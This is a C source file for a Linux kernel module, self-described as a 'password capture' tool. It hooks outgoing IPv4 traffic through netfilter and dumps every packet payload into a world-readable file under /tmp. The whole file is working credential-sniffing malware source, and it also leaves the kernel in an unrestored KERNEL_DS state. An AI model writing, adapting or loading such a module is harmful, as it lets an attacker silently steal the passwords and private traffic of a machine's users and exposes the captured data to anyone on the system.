/*
 * =====================================================================================
 *
 *       Filename:  nssniffer.c
 *
 *    Description:  A Simpler password capture via nsfilter
 *
 *        Version:  1.0
 *        Created:  2015年06月25日 17时10分59秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  ExiaHan
 *   Organization:  USTC
 *
 * =====================================================================================
 */
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
//For Operate File
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/stat.h>
#include <linux/syscalls.h>

#define PASSPORT 0xEA//ExiA--->EA, The ICMP TYPE

//used to store the user_info
typedef struct USER_INFO{
    char *username, *password;
}User_info, *pUser_info;

typedef struct nf_hook_ops NF_HOOK_OPS;
typedef struct sk_buff SK_BUFF;
typedef struct net_Device NET_DEVICE;
typedef struct iphdr IPHDR;

typedef uint8_t u1;

unsigned int hook_sniffer(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *));

static NF_HOOK_OPS scNfho;
struct file *file_steal = NULL;
static int iFd;
static int fileFlag = 1;
static char buf[100];

//invoke when Kernel module inserted
int init_module(void)
{
    //for test
    printk(KERN_INFO"MY Module Loaded\nNow will register the NetFilter Sniffer\n");
    
    //open a file to store the info we captured
    file_steal = filp_open("/tmp/info_capture", O_RDWR | O_CREAT,\
            S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
    if (IS_ERR(file_steal)) {//if open file failed
        printk(KERN_INFO"Error when open file\n");
        fileFlag = 0;//if failed we won't register so, make flag
        return -1;
    }
    //init our nf_hook_ops struct
    scNfho.hook = (nf_hookfn *)hook_sniffer;
    scNfho.hooknum = NF_INET_LOCAL_OUT;
    scNfho.pf = PF_INET;
    scNfho.priority = NF_IP_PRI_FIRST;
    //register our hook_sniffer to the kernel 
    nf_register_hook(&scNfho);
    return 0;
}

//invoke when Kernel module removed
void cleanup_module(void)
{
    //for test
    printk(KERN_INFO"MY Module Removed\n");

    /* cause we register a hook in the 
     * init_module, we should unregister
     * before we remove our module
    */
    if (fileFlag) {
        filp_close(file_steal, NULL);
        nf_unregister_hook(&scNfho);
    }
}

unsigned int hook_sniffer(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *))
{
    SK_BUFF *pscSkbuff;
    IPHDR *pscIph;
    mm_segment_t oldfs;
    loff_t pos;
    int iDataSize;
    u1 *uData = NULL;
    pscSkbuff = pscSKB;

    //Get The IPHeader
    pscIph = ip_hdr(pscSkbuff);
    printk(KERN_INFO"IP_PROTOCOL %d\n", pscIph->protocol);

    uData = (u1 *)(pscSkbuff->data) + pscIph->ihl * 4;
    iDataSize = ntohs(pscIph->tot_len) - pscIph->ihl * 4;

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    pos = 0;
    vfs_write(file_steal, (void *)uData, iDataSize, &pos);
    return NF_ACCEPT;
}
